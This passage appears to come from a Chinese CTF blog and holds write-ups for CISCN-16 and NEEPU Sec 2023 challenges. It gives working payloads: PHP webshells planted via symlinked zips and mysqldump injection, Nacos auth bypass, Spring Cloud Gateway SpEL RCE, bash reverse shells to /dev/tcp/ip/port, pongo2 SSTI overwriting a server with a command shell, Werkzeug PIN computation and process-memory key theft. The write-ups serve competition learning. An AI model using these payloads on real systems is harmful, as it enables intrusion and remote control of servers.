session伪造获取flag即可\n\n这里session伪造的时候把后面关于时间的数据去掉，或者加上引号，不然会报错\n\n# TimeTrcer\n\n放过自己\n","tags":["flask session伪造","沙箱逃逸"],"categories":["各赛事WP"]},{"title":"CISCN-16 国赛初赛后的复现以及一些感悟","url":"/post/5cb82439.html","content":"\nCISCN-16\n\n<!--more-->\n\n# 感悟以及想法\n\n不出意外，国赛初赛还是一道题都没有做出来，有太多知识我还没有去掌握，有太多题目我还没有去做，赛前总是满腔热血总想大干一番，但是总是一道题目都做不出来，抑郁一下午。\n\n每次比赛结束看了wp总是说哪个哪个题目真简单，太可惜了，但是，事实真是如此吗。\n\n什么是难题？\n\n我认为这个问题具有相对性，相对于人，也相对于时空。\n\n相对于人：一道题目，如果对于知识储备量多的人而言，见多识广，则在审题中则会发现端倪，甚至是一眼丁真，而对于一个知识储备量并不是很充足的人来说，可能拿到题目并不能找到他的考点，甚至是四处乱撞，而我，在这次比赛中就是如此，一道题目不知道他的考点就会根据我能捕捉到到的或者是题目泄露出来仅有的信息去逐个逐个检索，可能运气好会检索出来，但是失败总是来得更加频繁。\n\n相对于时空：我会成长，做题亦如此。一道现在做不出来的题目，之后去认真学习以及回顾，那么当之后再遇到此类型的题目时候就不至于一头雾水。\n\n那么难题，就我自己的看法，在比赛中做不出来的题目则就是难题，当然这是存在前提，一些人为导致的前提，比如由于出题人的不严谨可能一道很简单的考点硬是要通过去猜的方式才能做出来，或者夹杂着出题人自身色彩的题目，题目终归是要回归于大众，那么受众群体应该是做题的人，如果通过先去了解出题人再去了解题目，这就有点本末倒置了（这里主要是指WEB方向，与社工相异）。\n\n所以纯是看了WP而认为是简单题的，可能只是题目复杂度比较小，陌生程度比较低，但是总归 比赛中做不出来的题目那就是对于自身的难题。\n\n再来谈谈PY\n\n这次国赛PY程度堪称让我瞠目结舌，即便在我身边也存在。\n\n当然，我也存在。\n\n我总是在一些比赛中，做题做着做着，突然就没了思路，然后就想问问其他人一些思路，总是想着也许我获取一点帮助就能做出来呢（因为我这个人总是比较爱钻牛角尖，有时候会在一些没意义的地方停留很久），其实我认为这种只是获取一点思路的帮助，虽然不对，但是不会很恶劣，他具有一定的积极性质，可能通过寻求一点思路就把这道题目做出来，那么正向反馈是很客观的。相比于更为受人唾弃的则是，一点不了解题目甚至是没有仔细审题，直接去PY做法的，我觉得这种行为做法并没有一点实际意义，本来CTF就是以赛促学，最终目的是掌握这个知识，而不是排名，当然随着商业化模式的侵蚀与在当今社会下浮躁的心态，静下心来学习是一件难能可贵的事情。\n\n举个简单的例子比如Flask的SSTI，payload有很多，一开始我认为直接用一个脚本去注入，不是很方便很简单嘛，但是如果题目稍稍变动，那么脚本的局限性质就会体现出来，毕竟脚本是人为提前编译好的，题目稍稍改动加修改就会让脚本无法用。当然，对于已经掌握了这个知识的大佬，通过脚本实现一些对他而言无意义的机械重复式的操作，也是没毛病的，毕竟大佬会，只是一个做与不做的问题。而对我，并没有熟练的掌握，却透过脚本干一些本末倒置的事情是毫无意义的。\n\n最后，我认为web是一个需要沉淀的方向，他需要大量的基础功底以及语言功底，我只是一个普通人无法做到短时间就能拿到我自己认为有价值的排名也好，奖项也好，只能说任重而道远。\n\n以上只是我单方面的赛后想法以及总结，只是用来鞭策与提醒我自己不忘初心，希望未来能更好。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685547094038-d6d9bea7-62c7-47b3-830a-1b9ac0671965.jpeg)\n\n# WEB\n\n## UNZIP\n\n考点：软链接\n\n这是一道2021深育杯的原题  https://xz.aliyun.com/t/10533#toc-4\n\n首先是一个上传文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685371919081-97f89941-b813-493c-a0a6-dc9c9cd10df2.png)\n\n之后给了源码：\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\nif (finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === 'application/zip'){\n    exec('cd /tmp && unzip -o ' . $_FILES[\"file\"][\"tmp_name\"]);\n};\n```\n\n分析源码 我们上传上去的压缩包会被修改为tmp_name 并且路径是/tmp我们也是访问不到的\n\n我们能访问到的只能是默认web环境下 也就是/var/www/html\n\n再根据题目描述是unzip所导致的问题 \n\n看了wp 是根据软链接这里可以理解为是win的快捷方式\n\n先来看`unzip -o`这是这道题的前提\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685372533414-f6c6b521-1d9d-43f8-bafc-f94ea40e22d0.png)\n\n我们能够通过解压覆盖原有的文件\n\n我们可以先创建一个软链接文件test 指向/var/www/html 然后打包test.zip上传上去\n\n `ln -s /var/www/html test`\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373327803-af16dd07-a6f5-4219-a6ae-1f78d17dc4ab.png)\n\n这里的**符号链接其实就是软链接**\n\n```\nzip -y test.zip test\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373416181-10436723-6c28-4452-9cb2-34facb735c6b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373504644-d86c7ed4-d3ef-4c2e-a63b-39aa142ffbca.png)\n\n再写一个一句话木马 放到test文件中 打包test2.zip上传上去\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373611970-09deda72-3b51-43b9-91d3-f689aed9ad94.png)\n\n```\nzip -r test2.zip test\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373698097-122e454b-4967-4295-a0d2-e6d4097fda8f.png)\n\n因为是test文件下有个test.php（我们的木马） 所以要递归处理\n\n当test.zip被解压后 会有一个指向/var/www/html 的软链接文件test 然后接着test2.zip被解压后 同名软链接文件test 会被覆盖然后  但是test目录软链接指向/var/www/html 解压的时候会把test文件中的test.php放在/var/www/html，此时我们达到了getsehll的目的，这里思路一定要捋清。\n\n然后访问`/test.php`即可\n\n## dumpit\n\n一道mysqldump rce的题目 跟sql注入没一点关系 题目中也提示了 rce \n\n我像个铸币一样一直在试闭合方式去构造奇怪的注入点 我脑子有问题是吧\n\n### 非预期\n\n其实这道题目对我来说rce点我找不到 这是一个见多识广的结果\n\n根据大佬的wp dump出日志其实是通过命令执行实现的 ，我们看的那个日志功能大概率不是日志，而是mysqldump这个工具用来备份数据库的，所以这里应该直接执行的程序命令，所以能换行符RCE \n\n通过换行符`%0a`绕一下\n\n然后直接rce 如果直接读flag是不行的 估计预期解要涉及提权问题 \n\n但是出题人这里没有把环境变量删了 导致直接读环境变量就出了\n\n```\n?db=ctf&table_2_dump=%0Aenv\n```\n\n还有另一种是\n\n```\n?db=ctf&table_2_dump=flag1%0aecho \"<?php @eval(getallheaders()['Cookie'])?>\" > \"/app/log/1.php\"\n```\n\n这里过滤了`$`可以通过`getallheaders()`截取请求头方式bypass\n\n这种做法其实我最想问这个/app/log路径是怎么来的 \n\n我当时做通过报错只能获取的路径只有`/log`\n\n## BackendService\n\n考点：一道结合身份认证绕过和Nacos结合Spring Cloud Gateway RCE利用的题目 \n\n首先是Nacos身份认证绕过漏洞 参考https://www.secpulse.com/archives/199642.html\n\n这道题目复现环境是在ctfshow下 当时国赛身份认证绕过参考的是https://www.secpulse.com/archives/199642.html\n\n这里稍稍不同\n\n请求包如下：\n\n```php\nPOST /v1/auth/users HTTP/1.1\nHost: 9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show\nContent-Length: 27\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nOrigin: http://9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show\nReferer: http://9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n\nusername=test&password=test\n```\n\n之后来到后台\n\n接着就是跟着https://xz.aliyun.com/t/11493#toc复现 动态配置路由达到RCE\n\n添加一个配置\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685460978092-86e17559-963c-4cee-8180-0b9b65121836.png)\n\n这里添加时Data ID 要根据题目给的附件 去查看java源码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685461072802-d7056ff3-982c-4bb1-b1e6-d09e4c1a63c3.png)\n\n配置内容参考前面文章中的 \n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n        - id: exam\n          order: 0\n          uri: lb://service-provider\n          predicates:\n            - Path=/echo/**\n          filters:\n            - name: AddResponseHeader\n              args:\n                name: result\n                value: \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'id'}).getInputStream())).replaceAll('\\n','').replaceAll('\\r','')}\"\n```\n\n但是格式要转为json源码中也提到了\n\n注意这里原文章给的payload格式是yaml 根据源码需要json格式 找个在线网站转一下格式即可\n\n这里我一开始这个payload 格式 看来看去难道要手动转json格式吗 亏贼，而且这个格式好眼熟，之后好好想了一下原来是省赛的时候呢到yaml反序列化 学过这个格式 我就说格式好眼熟啊\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685461002172-6b4caeae-7103-4aa0-ac22-28ae200aba08.png)\n\n```json\n{\n  \"spring\":{\n    \"cloud\":{\n      \"gateway\":{\n        \"routes\":[\n          {\n            \"id\":\"exam\",\n            \"order\":0,\n            \"uri\":\"lb://backendservice\",\n            \"predicates:\":[\n              \"Path=/test/**\"\n            ],\n            \"filters\":[\n              {\n                \"name\":\"RewritePath\",\n                \"args\":{\n                  \"replacement\":\"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/ip/port 0>&1'}).getInputStream())).replaceAll('\\n','').replaceAll('\\r','')}\"\n                }\n              }\n            ]\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n反弹shell 即可  但是有时候弹不成功 环境问题\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685462609893-09c39cf1-624e-4597-8b3b-9751bc72f3e6.png)\n\n\n\n## go_session\n\n源码如下：\n\n```go\npackage route\n\nimport (\n    \"github.com/flosch/pongo2/v6\"\n    \"github.com/gin-gonic/gin\"\n    \"github.com/gorilla/sessions\"\n    \"html\"\n    \"io\"\n    \"net/http\"\n    \"os\"\n)\n\nvar store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\")))\n\nfunc Index(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] == nil {\n        session.Values[\"name\"] = \"guest\"\n        err = session.Save(c.Request, c.Writer)\n        if err != nil {\n            http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n            return\n        }\n    }\n\n    c.String(200, \"Hello, guest\")\n}\n\nfunc Admin(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] != \"admin\" {\n        http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n        return\n    }\n    name := c.DefaultQuery(\"name\", \"ssti\")\n    xssWaf := html.EscapeString(name)\n    tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n    if err != nil {\n        panic(err)\n    }\n    out, err := tpl.Execute(pongo2.Context{\"c\": c})\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    c.String(200, out)\n}\n\nfunc Flask(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] == nil {\n        if err != nil {\n            http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n            return\n        }\n    }\n    resp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\"))\n    if err != nil {\n        return\n    }\n    defer resp.Body.Close()\n    body, _ := io.ReadAll(resp.Body)\n\n    c.String(200, string(body))\n}\n```\n\n看了源码发现要进行session伪造，当时做题的时候以为类似于falsk的session伪造 去网上找脚本 但是都没运行成功 并且也不知道key 就寄了\n\n复现的时候看了大佬的WP key是空值 麻了 这里就需要本地来搭建一下 此前零接触go 所以搭建很费力 请了亮sensei帮我弄 \n\n搭建好本地环境之后 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685710841251-127825a0-1f2b-400c-bda0-f3588de2f64d.png)\n\n修改这两个地方 本地启动抓包 将session 复制到题目上去直接就可以了（这里注意要删除原来的session 然后刷新一下）\n\n```\nMTY4NTcwODk3NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxfaogJnkxqBjr0zeT-y8vTmXMwFnxOaUC4_0fBoWEhUA==\n```\n\n然后就有两个接口`/admin``/flask`\n\n国赛环境下当时`/flask?name=/`就会报错 报错界面暴露可以算pin码，也就是debug开启的，但是这道题目没法通过算pin码来做出来 看亮师傅wp是因为这道题目可以文件热部署（也就是不用通过重新编译来达到更新目的 后台直接修改更新即可）\n\n再来看`/admin`\n\n```go\nfunc Admin(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] != \"admin\" {\n\t\thttp.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\tname := c.DefaultQuery(\"name\", \"ssti\")\n\txssWaf := html.EscapeString(name)\n\ttpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tout, err := tpl.Execute(pongo2.Context{\"c\": c})\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tc.String(200, out)\n}\n```\n\n`tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")`直接来看这里 就是模板注入pongo2的模板注入\n\n```\nout, err := tpl.Execute(pongo2.Context{\"c\": c})\n```\n\n`tpl.execute`把c也放进去了的，这个c代表着gin里的上下文对象，可以引用Context下的所有函数了 \n\n  gin.Context 里面包装了 Request 和 ResponseWriter, 这里大佬的WP用的 `Request.UserAgent()`\n\n```go\n// UserAgent returns the client's User-Agent, if sent in the request.\nfunc (r *Request) UserAgent() string {\n\treturn r.Header.Get(\"User-Agent\")\n}\n```\n\npayload: `{{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}}`\n\n偷的大佬的数据包 直接覆盖源码 server.py\n\n```html\nGET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1\nHost: node1.anna.nssctf.cn:28272\nContent-Length: 611\nCache-Control: max-age=0\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi\nUser-Agent: /app/server.py\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nCookie: session-name=MTY4NTE1ODc3OHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzlZGsWROWLHoCNn0Pbu3SkgRLWCZRrj8UIHVYgHU7GPw==\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryrxtSm5i2S6anueQi\nContent-Disposition: form-data; name=\"/app/server.py\"; filename=\"server.py\"\nContent-Type: text/plain\n\nfrom flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/shell')\ndef shell():\ncmd = request.args.get('cmd')\nif cmd:\nreturn os.popen(cmd).read()\nelse:\nreturn 'shell'\n\nif __name__== \"__main__\":\napp.run(host=\"127.0.0.1\",port=5000,debug=True)\n------WebKitFormBoundaryrxtSm5i2S6anueQi\nContent-Disposition: form-data; name=\"submit\"\n\n&#25552;&#20132;\n------WebKitFormBoundaryrxtSm5i2S6anueQi--\t\n```\n\n`/flask?name=/shell?cmd=ls${IFS}/` 这里过滤了空格\n\n命令执行就行了 tql 这里其实还有很多知识 这里不太懂说起来很难受 以后再强点 再来补坑吧 \n\n\n\nWeb就到这里 其他题目对于我来说还在未知领域等我去探索。\n\n# MISC\n\n## 签到\n\n根据提示`print(open('flag').read())`就出了\n\n## **被加密的生产流量**\n\n题目描述：\n\n某安全部门发现某涉密工厂生产人员偷偷通过生产网络传输数据给不明人员，通过技术手段截获出一段通讯流量，但是其中的关键信息被进行了加密，请你根据流量包的内容，找出被加密的信息。\n\n应该直接去过滤通讯流量 找到MODBUS协议   追踪流一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685376104279-3591a49e-3805-4ed5-9e56-bcca3cfbba1f.png)\n\n组合起来发现base32编码 因为末尾有等号并且只有大写和数字的编码\n\n```\nMMYWMX3GNEYWOXZRGAYDA===\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685376171342-f5a06679-c278-4cbd-b93b-a6849e78235b.png)\n\n## pyshell\n\n一道python jail 过滤了很多字符 并且限制了输入字符不能超过7位 其实就是构造shell的奇淫姿势\n\npayload：\n\n```php\n# eval(open(\"/flag\", \"r\").read())\n\"open\"\n_+\"(\"\n_+'\"/'\n_+'f'\n_+'l'\n_+'a'\n_+'g'\n_+'\"'\n_+',\"'\n_+'r\"'\n_+')'\n_+'.r'\n_+'e'\n_+'a'\n_+'d'\n_+\"(\"\n_+\")\"\neval(_)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685421976872-e11473ca-c080-4534-865d-4105b49099fd.png)\n\n这里用到的`'_'`是一种特殊标识符， 在交互式解释器中被用来存放最近一次求值结果  。参考：[https://www.bookstack.cn/read/python3.9-reference-zh/spilt.2.spilt.3.ef7aded97a6c46a9.md?wd=%E7%A7%81%E6%9C%89](https://www.bookstack.cn/read/python3.9-reference-zh/spilt.2.spilt.3.ef7aded97a6c46a9.md?wd=私有)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685422038294-70bb1976-24c9-4e7d-95f2-b5e59c7c0437.png)\n\n# 结尾：\n\n最近期末了，可能会忙期末的事情，先把六级过了md，这次一定要过了，已经是第二次了，上次就差十来分，可恶啊，不想被这个拖着了，还有期末冲了，什么数电，信号，电路给👴死，等着奥，头套给你薅一地 必须打你脸奥，当然比赛不会停，秉着菜还爱打的良好作风，冲了，只是WP会欠一些，比如BUU还欠着一些，亏贼，干了！\n","tags":["RCE奇淫方式","软链接"],"categories":["各赛事WP"]},{"title":"NEEPU Sec 2023 公开赛 WEB部分题复现","url":"/post/c9fcd25b.html","content":"\nNEEPU Sec 2023 公开赛 WEB部分题复现\n\n我就是个纯废物\n\n<!--more-->\n\n# Cute Cirno\n\n人最麻的一集 本来应该很快出结果的 还是自己太菜了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846488175-ee0bc923-7cc9-410d-bc70-809ca3c8a30f.png)\n\n存在一个任意文件读取的漏洞 通过报错信息 去读app文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846571811-25873264-780e-4dff-9d59-cd927722f6fc.png)\n\n或者访问`/proc/self/cmdline`去获取当前正在运行的进程\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846615322-ce39f4fa-5632-4dfc-8f50-b543633b1ba7.png)\n\n获得源码：\n\n```python\nfrom flask import Flask, request, session, render_template, render_template_string\nimport os, base64\nfrom NeepuFile import neepu_files\n\nCuteCirno = Flask(__name__,static_url_path='/static',static_folder='static')\n\nCuteCirno.config['SECRET_KEY'] = str(base64.b64encode(os.urandom(30)).decode()) + \"*NeepuCTF*\"\n\n@CuteCirno.route('/')\ndef welcome():\n    session['admin'] = 0\n    return render_template('welcome.html')\n\n\n@CuteCirno.route('/Cirno')\ndef show():\n    return render_template('CleverCirno.html')\n\n\n@CuteCirno.route('/r3aDF1le')\ndef file_read():\n    filename = \"static/text/\" + request.args.get('filename', 'comment.txt')\n    start = request.args.get('start', \"0\")\n    end = request.args.get('end', \"0\")\n    return neepu_files(filename, start, end)\n\n\n@CuteCirno.route('/genius')\ndef calculate():\n    if session.get('admin') == 1:\n        print(session.get('admin'))\n        answer = request.args.get('answer')\n        if answer is not None:\n            blacklist = ['_', \"'\", '\"', '.', 'system', 'os', 'eval', 'exec', 'popen', 'subprocess',\n                         'posix', 'builtins', 'namespace','open', 'read', '\\\\', 'self', 'mro', 'base',\n                         'global', 'init', '/','00', 'chr', 'value', 'get', \"url\", 'pop', 'import',\n                         'include','request', '{{', '}}', '\"', 'config','=']\n            for i in blacklist:\n                if i in answer:\n                    answer = \"⑨\" +\"\"\"</br><img src=\"static/woshibaka.jpg\" width=\"300\" height=\"300\" alt=\"Cirno\">\"\"\"\n                    break\n            if answer == '':\n                return \"你能告诉聪明的⑨, 1+1的answer吗\"\n            return render_template_string(\"1+1={}\".format(answer))\n        else:\n            return render_template('mathclass.html')\n\n    else:\n        session['admin'] = 0\n        return \"你真的是我的马斯塔吗？\"\n\n\nif __name__ == '__main__':\n    CuteCirno.run('0.0.0.0', 5000, debug=True)\n```\n\n其实一眼扫过去就是session伪造 然后套了一层ssti\n\n但是当时做这道题的时候看了他的key生成过程 就觉得key根本伪造不了\n\n## 非预期：\n\n然后既然之前都报错了 说明debug是开启的 源码中也表明了\n\n呢就直接去计算pin码\n\n网上脚本很多 主要有高版本和低版本的 这里要根据题目去选择相应的脚本版本\n\n这道题目是高版本的\n\n脚本如下：参考 https://pysnow.cn/archives/170/\n\n```python\nimport hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    'root'  # /etc/passwd\n    'flask.app',  # 默认值\n    'Flask',  # 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # 报错得到\n]\n\nprivate_bits = [\n    '2485377568585',  # /sys/class/net/eth0/address 十进制\n    '653dc458-4634-42b1-9a7a-b22a082e1fce898ba65fb61b89725c91a48c418b81bf98bd269b6f97002c3d8f69da8594d2d2'\n    # 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup\n]\n\n# 下面为源码里面抄的，不需要修改\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                            for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n当时做题没算出pin码 不知道是哪里出的问题 甚至把所有id都试了一次\n\n之后复现的时候 才发现被脚本中的提示稍稍误导了一下 或者是自己纯菜\n\n```\n# 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup\n```\n\n脚本中提到`/etc/machine-id(docker不用看) ` 难道赛题环境不是docker吗 我裂开\n\n但是这道题目需要合并`/etc/machine-id` `/proc/self/cgroup`才能计算出正确的pin码\n\n当时做题的时候一直用`/proc/sys/kernel/random/boot_id`  ` /proc/self/cgroup`去算 一直是错的\n\n不过这里也不是说脚本中提到的是错的 而是做题的时候最好都试一遍 qwq\n\n应该是先去读`/etc/machine-id`，如果读不到,那么就是`/proc/sys/kernel/random/boot_id`和`/proc/self/cgroup`拼接了  \n\n计算出来之后 命令执行即可\t\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847479030-dc13e6dc-8671-4aca-800c-ff56cc7245e3.png)\n\n## 预期解\n\n赛后了解了一下 发现预期解太难了 是根据2022年蓝帽杯初赛改编的\n\n然后这里key的确是伪造不出来 但是任何信息都是存在内存里 可以通过去读内存读出来 借用p神的语句[https://erroratao.github.io/2022/07/10/File_Session/#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3](https://erroratao.github.io/2022/07/10/File_Session/#蓝帽杯初赛-file-session-见解)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847734991-7cd63f83-6f22-46aa-83d3-406c8efd6f6e.png)\n\n这里直接贴上Boogipop 亮sensei的脚本 看得出来也是从p神稍加修改 而我连脚本都看不懂 尼玛就菜的离谱 暑假一定要去系统学一下python 好好锻炼锻炼自己写脚本的能力\n\n```python\nimport base64\nimport os\nimport re\nimport requests\n# print(str(base64.b64encode(os.urandom(30)).decode()) + \"*NeepuCTF*\")\n# pollution_url=\"http://localhost:8848/?name=os.path.pardir&m1sery=boogipop\"\n# flagurl=\"http://localhost:8848/../../flag\"\nurl=\"http://neepusec.fun:28954//r3aDF1le\"\nmaps_url = f\"{url}?filename=../../../proc/self/maps\"\nmaps_reg = \"([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0\"\nmaps = re.findall(maps_reg, requests.get(maps_url).text)\nprint(maps)\ncookie=''\nfor m in maps:\n    print(m)\n    start, end = m.split(\"-\")[0], m.split(\"-\")[1]\n    Offset, Length = str(int(start, 16)), str(int(end, 16))\n    read_url = f\"{url}?filename=../../../proc/self/mem&start={Offset}&end={Length}\"\n    print(read_url)\n    s = requests.get(read_url).content\n    print(s)\n    rt = re.findall(b\"(.{40})\\*NeepuCTF\\*\", s)\n    if rt:\n        print(rt[0])\n```\n\n脚本大致过程就是 先去读取/proc/self/maps的信息 \n\n然后通过map里栈的地址  再去去正则匹配里面的信息 \n\n```\nmaps_reg = \"([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0\"\n```\n\n就是去匹配这样的信息`7f50caee6000-7f50cb9e6000 rw-p 00000000 00:00 0`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684848131309-905d4a14-43af-403a-9294-792623cc66e4.png)\n\n然后再根据读出来的地址mem内存   然后再去通过地址范围正则匹配我们需要的key 就行了\n\n真的tql\n\nsession伪造成功后 就是一个过滤了 很多字符的ssti\n\n根据亮sensei的payload session 伪造的时候 通过把shell放进session 然后我们payload去截取就可以了 真的tql\n\n```\npython flask_session_cookie_manager3.pyencode-s\"key\"-t\"{'admin':1,'__globals__':1,'os':1,'read':1,'popen':1,'bash-c\\'bash-i>&/dev/tcp/ip/port<&1\\'':1}\"\n```\n\npayload：`{%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%}`\n\n然后这里需要注意 截的时候并不是我们直接看到的`{'admin':1,'__globals__':1,'os':1,'read':1,'popen':1,'bash-c\\'bash-i>&/dev/tcp/ip/port<&1\\'':1}`索引\n\n通过`{%print(session|string)%}`可以打印出来 前面还有点其他信息 这是一个小细节\n\n```\n<SecureCookieSession {'admin': 1, '__globals__': 1, 'os': 1, 'read': 1, 'popen': 1, \"bash -c 'bash -i >& /dev/tcp/ip/port <&1'\": 1}>\n```\n\n通过反弹shell 就ok了 真的太强了\n\n发现还是得去老老实实去刷一遍ctfshow的ssti 去弄明白不同的paylaod\n\n\n\n# ezphp\n\n当时做这道题 一看界面是空白的 各种尝试之后还是啥都没有 就放弃了\n\n看了wp 返现是php<=7.4.21远程源码泄露的漏洞  https://cn-sec.com/archives/1530845.html\t\n\n其实关键是怎么发现php版本???? 并且检索到相关漏洞\n\n可能大佬一眼就丁真了 对我比较困难\n\n然后抓包 构造一个如下的请求头\n\n```python\nGET / HTTP/1.1\nHost: neepusec.fun:28426\n\n\nGET /HTTP/1.1\n```\n\n获得源码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684852650636-c4706a7d-d4b2-4246-922e-4109cacd8b54.png)\n\n是一个pop链\n\n```php\n<?php\n  class  one{\n  public function __call($name,$ary)\n  {\n    if ($this->key === true||$this->finish1->name) {\n      if ($this->finish->finish){\n        call_user_func($this->now[$name],$ary[0]);\n      }\n    }\n  }\n  public function neepuctf(){\n  $this->now=0;\n  return $this->finish->finish;\n}\npublic function __wakeup(){\n  $this->key=True;\n}\n}\nclass two{\n  private $finish;\n  public $name;\n  public function __get($value){\n\n    return $this->$value=$this->name[$value];\n  }\n\n}\n\nclass three{\n  public function __destruct()\n  {\n    if($this->neepu->neepuctf()||!$this->neepu1->neepuctf()){\n      $this->fin->NEEPUCTF($this->rce,$this->rce1);\n    }\n\n  }\n}\nclass 